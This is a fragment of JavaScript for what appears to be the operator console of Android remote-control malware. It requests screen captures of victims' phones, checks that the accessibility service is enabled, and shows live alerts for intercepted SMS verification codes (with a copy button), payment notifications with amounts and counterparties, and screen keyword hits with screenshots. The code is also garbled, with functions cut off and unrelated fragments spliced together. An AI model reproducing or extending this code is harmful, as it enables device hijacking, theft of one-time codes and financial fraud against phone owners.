            ws2.send(JSON.stringify({itype:'slr_panel', subc:'join', pid: pid(), usercheck: stoGet('CURRENT-USER')}));
            ws2.send(JSON.stringify({itype:'slr_panelsend', subc:'screen', comand:'snap', stype:'1', pid: pid(), usercheck: stoGet('CURRENT-USER')}));
            setTimeout(function(){ try{ ws2.close(); }catch(e){} }, 2000);
          };
          ws2.onerror = function(){ try{ ws2.close(); }catch(e){} };
        }catch(e){}
        setTimeout(function(){
          connState = 'idle';
          btn.textContent = '连接投屏';
          btn.style.background = 'linear-gradient(90deg,#3b5bf0,#6b83ff)';
          btn.style.color = '#ffffff';
          btn.style.cursor = 'pointer';
          btn.style.boxShadow = '0 8px 26px rgba(79, 107, 254,.35)';
        }, 3000);
      };
      bar.appendChild(btn);
    }
    var items = bar.querySelector('#zglDeviceBarItems');
    if(!items) return;
    var hb = '';
    try{
      var hbEl = document.querySelector('.zglLiveHeartbeat');
      if(hbEl){
        var tEl = hbEl.querySelector('.zglStatusTime');
        hb = tEl ? tEl.textContent.trim() : '';
        if(hbEl.getAttribute('data-connected') === 'true' && !snap.isonline) snap.isonline = '1';
      }
    }catch(e){}
    var bat = (readInfoRow('电池') || snap.battery || '').replace(/[^0-9%]/g,'');
    var model = readInfoRow('型号') || snap.model;
    var accTxt = readInfoRow('无障碍');
    if(!accTxt && snap.acc) accTxt = (snap.acc === '1') ? '已开启' : '未开启';
    var online = snap.isonline;
    var dot = online === '1' ? '#16a34a' : (online === '0' ? '#e05d4f' : '#5a544a');
    var simTxt = snap.sim || '…';
    var carrierTxt = snap.carrier ? (' ' + snap.carrier) : '';
    var simColor = snap.sim === '有卡' ? '#49d9a4' : (snap.sim === '无卡' ? '#ff8a7a' : '#9a8f7a');
    items.innerHTML =
      '<span><i style="display:inline-block;width:8px;height:8px;border-radius:50%;background:'+dot+';margin-right:6px;"></i>' + (online==='1'?'在线':online==='0'?'离线':'状态…') + '</span>' +
      '<span>心跳 <b style="color:#14213d;">'+esc(hb||'—')+'</b></span>' +
      '<span>SIM <b style="color:'+simColor+';">'+esc(simTxt+carrierTxt)+'</b></span>' +
      '<span>电量 <b style="color:#14213d;">'+esc(bat||'—')+'</b></span>' +
      '<span>机型 <b style="color:#5b6b8c;">'+esc(model||'—')+'</b></span>' +
      '<span>无障碍 <b style="color:'+(/已开启/.test(accTxt||'')?'#49d9a4':'#ff8a7a')+';">'+esc(accTxt||'—')+'</b></span>';
  }

  function ensureOverlays(){
    if(!onInfo() || !pid()) return;
    var group = document.querySelector('.image-box-group');
    if(!group) return;
    var boxes = group.querySelectorAll('.image-box');
    if(boxes.length < 2) return;
    if(streamActive()){
      var e1 = document.getElementById('zglGuideA'); if(e1) e1.style.display='none';
      var e2 = document.getElementById('zglGuideB'); if(e2) e2.style.display='none';
      return;
    }
    var boxA = boxes[0], boxB = boxes[1];
    if(!document.getElementById('zglGuideA')){
      var g1 = document.createElement('div');
      g1.id = 'zglGuideA';
      g1.style.cssText = 'position:absolute;inset:0;z-index:30;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;background:rgba(242, 244, 249,.94);color:#14213d;text-align:center;padding:20px;box-sizing:border-box;font-family:v-sans,system-ui,sans-serif;';
      g1.innerHTML = '<div style="font-size:24px;">🎬</div><div style="font-size:15px;font-weight:800;color:#14213d;">三步开启投屏</div>'
        + '<div style="font-size:13px;color:#5b6b8c;line-height:2;">① 点击上方「连接投屏」按钮<br/>② 等待设备响应（约 3~10 秒）<br/>③ 实时画面自动出现在这里</div>'
        + '<div style="font-size:12px;color:#7d93ac;line-height:1.8;">长时间无画面？请确认：设备在线 · 无障碍已开启 · 屏幕处于亮屏状态</div>';
      if(getComputedStyle(boxA).position === 'static') boxA.style.position='relative';
      boxA.appendChild(g1);
    } else document.getElementById('zglGuideA').style.display='flex';
    if(!document.getElementById('zglGuideB')){
      var g2 = document.createElement('div');
      g2.id = 'zglGuideB';
      g2.style.cssText = 'position:absolute;inset:0;z-index:30;background:rgba(242, 244, 249,.94);color:#14213d;padding:18px;box-sizing:border-box;overflow:auto;font-family:v-sans,system-ui,sans-serif;';
      g2.innerHTML = '<div style="font-size:14px;font-weight:800;color:#14213d;margin-bottom:10px;">📋 设备速览</div><div id="zglGuideBList" style="font-size:13px;color:#5b6b8c;line-height:2;"></div>';
      if(getComputedStyle(boxB).position === 'static') boxB.style.position='relative';
      boxB.appendChild(g2);
    } else document.getElementById('zglGuideB').style.display='block';
    var lst = document.getElementById('zglGuideBList');
    if(lst){
      var rows = [];
      if(snap.model) rows.push('机型：' + esc(snap.model));
      if(snap.network) rows.push('网络：' + esc(snap.network));
      if(snap.region) rows.push('地区：' + esc(snap.region));
      if(snap.sim) rows.push('SIM卡：' + esc(snap.sim + (snap.carrier?'（'+snap.carrier+'）':'')));
      if(snap.note) rows.push('备注：' + esc(snap.note));
      var accTxt2 = readInfoRow('无障碍');
      if(accTxt2) rows.push('无障碍：' + esc(accTxt2));
      lst.innerHTML = rows.length ? rows.map(function(r){ return '<div>'+r+'</div>'; }).join('') : '<div style="color:#7d93ac;">等待设备数据…</div>';
    }
  }

  var intelWs = null, intelWsRetry = null;
  function ensureIntelWs(){
    if(!onInfo() || !pid()) return;
    if(intelWs && intelWs.readyState === 1) return;
    if(intelWs) return;
    try{
      intelWs = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/api/ws/');
      intelWs.onopen = function(){ intelWs.send(JSON.stringify({itype:'slr_panel', subc:'join', pid: pid(), usercheck: stoGet('CURRENT-USER')})); };
      intelWs.onmessage = function(ev){
        try{
          var m = JSON.parse(ev.data);
          if(m && m.type === 'intel_alert') showIntelBanner(m);
        }catch(e){}
      };
      intelWs.onclose = function(){ intelWs = null; clearTimeout(intelWsRetry); intelWsRetry = setTimeout(ensureIntelWs, 5000); };
      intelWs.onerror = function(){ try{ intelWs.close(); }catch(e){} };
    }catch(e){}
  }
  function showIntelBanner(m){
    try{
      var host = document.getElementById('zglIntelBannerHost');
      if(!host){
        host = document.createElement('div');
        host.id = 'zglIntelBannerHost';
        host.style.cssText = 'position:fixed;top:14px;right:16px;z-index:100000;display:flex;flex-direction:column;gap:8px;pointer-events:none;';
        document.body.appendChild(host);
      }
      var b = document.createElement('div');
      b.style.cssText = 'pointer-events:auto;background:rgba(247, 249, 253,.96);border:1px solid #4f6bfe;border-radius:10px;padding:10px 14px;font-size:13px;color:#14213d;box-shadow:0 12px 34px rgba(0,0,0,.5);max-width:360px;font-family:v-sans,system-ui,sans-serif;';
      var inner = '';
      if(m.kind === 'code'){
        inner = '\ud83d\udce9 <b style="color:#6b83ff;">\u9a8c\u8bc1\u7801 ' + __zglEscK(m.code) + '</b><span style="color:#9a8f7a;margin-left:6px;">' + (m.sender ? __zglEscK(m.sender) : '') + '</span><button data-zgl-copy style="margin-left:10px;background:#3b5bf0;border:0;color:#ffffff;border-radius:6px;padding:3px 10px;font-weight:700;cursor:pointer;">\u590d\u5236</button>';
      } else if(m.kind === 'pay'){
        var dir = m.direction === 'in' ? '<span style="color:#49d9a4;">\u6536\u5165</span>' : '<span style="color:#ff8a7a;">\u652f\u51fa</span>';
        inner = '\ud83d\udcb0 ' + (m.app ? __zglEscK(m.app) + ' ' : '') + dir + ' <b style="color:#6b83ff;">' + __zglEscK(m.amount) + '</b>' + (m.counterparty ? ' <span style="color:#9a8f7a;">' + __zglEscK(m.counterparty) + '</span>' : '');
      } else {
        var img = m.image_path ? '<a href="/' + __zglEscK(m.image_path) + '" target="_blank" style="color:#6b83ff;margin-left:8px;">\u622a\u56fe</a>' : '';
        inner = '\ud83d\udd14 \u5c4f\u5e55\u51fa\u73b0\u5173\u952e\u8bcd <b style="color:#ff9d8a;">[' + __zglEscK(m.keyword) + ']</b>' + img;

  function ensureIntelTab(){

        }, true);
      }

  }
  window.__zglLoadIntel = function(){
    try{
      var list = document.getElementById('zglIntelList');
      if(!list) return;
      var p = pid(); var tok = stoGet('ACCESS-TOKEN');
      list.innerHTML = '<div style="color:#9a8f7a;padding:20px;text-align:center;">\u52a0\u8f7d\u4e2d...</div>';
      var req = function(act){ return fetch('/api/EaodIntel.php?action=' + act, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:act, phone_id:p, token:tok})}).then(function(r){ return r.json(); }); };
      Promise.all([req('list_codes'), req('list_pay'), req('list_hits'), req('list_keywords')]).then(function(rs){
        list.innerHTML = '';
        var sec = function(t){ var d = document.createElement('div'); d.style.cssText = 'margin:6px 0 8px;font-size:13px;font-weight:700;color:#f0d9a0;'; d.textContent = t; return d; };
